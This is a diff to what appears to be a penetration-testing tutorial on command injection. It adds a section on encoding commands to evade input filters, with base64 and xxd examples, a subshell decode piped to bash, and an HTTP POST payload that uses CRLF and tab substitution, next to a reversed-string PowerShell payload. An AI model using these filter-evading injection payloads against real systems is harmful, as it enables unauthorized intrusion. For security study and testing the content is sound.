@@ -44,9 +44,22 @@ ip=127.0.0.1%0d%0aiex "$('imaohw'[-1..-20] -join '')"
 ## Encoded Commands
 Another technique is encoding commands, this may be helpful for commands containing filtered characters or characters that may be URL-decoded by the server. However, this may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute.
 
-In this case, we can utilize various tools such as ``
+In this case, we can utilize various tools such as `base64` for base64 encoding and `xxd` for hex encoding. For example:
+```nix
+echo "whoami" | base64
+```
+Which will return `d2hvYW1pCg==`. We can now create a command to decode the encoded string in a sub-shell and then pass it to bash to be executed:
+```nix
+bash<<<$(base64 -d<<<d2hvYW1pCg==)
+```
+Which we can then use as a payload:
+```http
+POST / HTTP/1.1
+Host: target-website.com
+...
 
-
+ip=127.0.0.1%0d%0abash<<<$(base64%09-d<<<d2hvYW1pCg==)
+```
 
 
 > Tip: Try to create your own unique obfuscation techniques by getting creative with Bash or Powershell. This way, it is much less likely to be denied by a filter or a WAF.
